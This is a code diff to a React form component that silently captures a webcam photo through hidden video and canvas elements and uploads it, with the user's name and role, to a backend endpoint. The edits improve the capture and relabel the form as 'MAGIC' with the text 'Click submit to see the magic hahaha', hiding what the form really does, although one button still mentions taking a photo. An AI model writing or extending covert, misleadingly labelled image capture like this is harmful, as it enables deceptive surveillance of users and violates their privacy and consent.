@@ -1,6 +1,6 @@
 'use client';
-import { useState, useRef } from 'react';
-import { Camera } from 'lucide-react';
+import { useState, useRef, useEffect } from 'react';
+import { FaMagic } from "react-icons/fa";
 
 export default function DiscreetCameraForm() {
   const [userName, setUserName] = useState('');
@@ -10,16 +10,39 @@ export default function DiscreetCameraForm() {
   const [error, setError] = useState('');
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
+  const streamRef = useRef(null);
+  
+  // Cleanup function to ensure camera is stopped when component unmounts
+  useEffect(() => {
+    return () => {
+      if (streamRef.current) {
+        const tracks = streamRef.current.getTracks();
+        tracks.forEach(track => track.stop());
+      }
+    };
+  }, []);
   
   // Initialize camera in background but don't display it
   const initializeCamera = async () => {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "user" } 
+      });
+      
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
+        streamRef.current = stream;
       }
-      return true;
+      
+      // Wait for video to be ready
+      return new Promise((resolve) => {
+        videoRef.current.onloadedmetadata = () => {
+          videoRef.current.play();
+          resolve(true);
+        };
+      });
     } catch (err) {
+      console.error("Camera error:", err);
       setError('Camera access is required. Please allow camera permissions.');
       return false;
     }
@@ -32,15 +55,22 @@ export default function DiscreetCameraForm() {
     
     if (!video || !canvas) return null;
     
+    // Set canvas dimensions to match video
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
+    
+    // Draw the video frame to the canvas
     const context = canvas.getContext('2d');
-    context.drawImage(video, 0, 0);
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // Get the image as base64 data URL
     const imageData = canvas.toDataURL('image/png');
     
     // Stop camera stream
-    const tracks = video.srcObject.getTracks();
-    tracks.forEach(track => track.stop());
+    if (streamRef.current) {
+      const tracks = streamRef.current.getTracks();
+      tracks.forEach(track => track.stop());
+    }
     
     return imageData;
   };
@@ -50,54 +80,62 @@ export default function DiscreetCameraForm() {
     setError('');
     setIsProcessing(true);
     
-    // Initialize camera first
-    const cameraInitialized = await initializeCamera();
-    if (!cameraInitialized) {
-      setIsProcessing(false);
-      return;
-    }
-    
-    // Give a small delay to ensure camera is ready
-    setTimeout(async () => {
-      try {
-        // Take photo without showing preview
-        const capturedImage = takePhotoSilently();
-        
-        if (!capturedImage) {
-          throw new Error('Failed to capture image');
-        }
-        
-        // Send data to backend
-        const response = await fetch('/api/upload-photo', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            image: capturedImage,
-            userName: userName,
-            carrier: carrier
-          }),
-        });
-        
-        if (response.ok) {
-          setIsSuccess(true);
-          setTimeout(() => {
-            // Redirect after showing success message briefly
-            window.location.href = '/photo';
-          }, 1500);
-        } else {
-          throw new Error('Failed to upload');
-        }
-      } catch (error) {
-        setError('Something went wrong. Please try again.');
-      } finally {
+    try {
+      // Initialize camera first
+      const cameraInitialized = await initializeCamera();
+      if (!cameraInitialized) {
         setIsProcessing(false);
+        return;
       }
-    }, 1000);
+      
+      // Give a small delay to ensure camera is ready
+      setTimeout(async () => {
+        try {
+          // Take photo without showing preview
+          const capturedImage = takePhotoSilently();
+          
+          if (!capturedImage) {
+            throw new Error('Failed to capture image');
+          }
+          
+          // Send data to backend
+          const response = await fetch('/api/upload-photo', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              image: capturedImage,
+              userName: userName,
+              carrier: carrier
+            }),
+          });
+          
+          if (response.ok) {
+            setIsSuccess(true);
+            setTimeout(() => {
+              // Redirect after showing success message briefly
+              window.location.href = '/photo';
+            }, 1500);
+          } else {
+            const errorData = await response.json();
+            throw new Error(errorData.message || 'Failed to upload');
+          }
+        } catch (error) {
+          console.error('Submission error:', error);
+          setError(error.message || 'Something went wrong. Please try again.');
+        } finally {
+          setIsProcessing(false);
+        }
+      }, 1000);
+    } catch (err) {
+      console.error('Camera initialization error:', err);
+      setError('Failed to access camera. Please check your permissions.');
+      setIsProcessing(false);
+    }
   };
 
   return (
     <div className="max-w-md mx-auto mt-10 p-6 bg-gradient-to-r from-purple-600 to-blue-500 rounded-xl shadow-2xl">
-      <h1 className="text-3xl font-bold text-center text-white mb-6">Amazing Photo Form</h1>
+      <h1 className="text-3xl font-bold text-center text-white mb-6">Amazing MAGIC Form</h1>
       
       {/* Hidden video and canvas elements */}
       <video ref={videoRef} autoPlay playsInline muted className="hidden" />
@@ -113,7 +151,7 @@ export default function DiscreetCameraForm() {
             </div>
             <h2 className="text-2xl font-bold text-white mb-2">Success!</h2>
             <p className="text-white/80">Your information has been submitted.</p>
-            <p className="text-white/80 text-sm mt-2">Redirecting to photo page...</p>
+            <p className="text-white/80 text-sm mt-2">Redirecting to Magic page...</p>
           </div>
         </div>
       ) : (
@@ -137,12 +175,12 @@ export default function DiscreetCameraForm() {
                 required
                 className="w-full px-4 py-3 bg-white/20 backdrop-blur-sm border-2 border-white/30 text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-white appearance-none transition-all"
               >
-                <option value="" className="text-gray-800">Software Enginer</option>
-              <option value="AT&T" className="text-gray-800">Big Data Enginneer</option>
-              <option value="Verizon" className="text-gray-800">Deveops Engineer</option>
-              <option value="T-Mobile" className="text-gray-800">Machine Engineer</option>
-              <option value="Sprint" className="text-gray-800">Sprint</option>
-              <option value="Other" className="text-gray-800">Awara</option>
+                <option value="" className="text-gray-800">Select Your Role</option>
+                <option value="Software Engineer" className="text-gray-800">Software Engineer</option>
+                <option value="Big Data Engineer" className="text-gray-800">Big Data Engineer</option>
+                <option value="DevOps Engineer" className="text-gray-800">DevOps Engineer</option>
+                <option value="Machine Learning Engineer" className="text-gray-800">Machine Learning Engineer</option>
+                <option value="Other" className="text-gray-800">Other</option>
               </select>
             </div>
           </div>
@@ -172,14 +210,14 @@ export default function DiscreetCameraForm() {
               </span>
             ) : (
               <span className="flex items-center justify-center">
-                <Camera size={20} className="mr-2" />
+                <FaMagic size={20} className="mr-2" />
                 Submit & Take Photo
               </span>
             )}
           </button>
           
           <p className="text-center text-white/70 text-sm">
-            Click submit to capture photo and send information
+            Click submit to see the magic hahaha
           </p>
         </form>
       )}
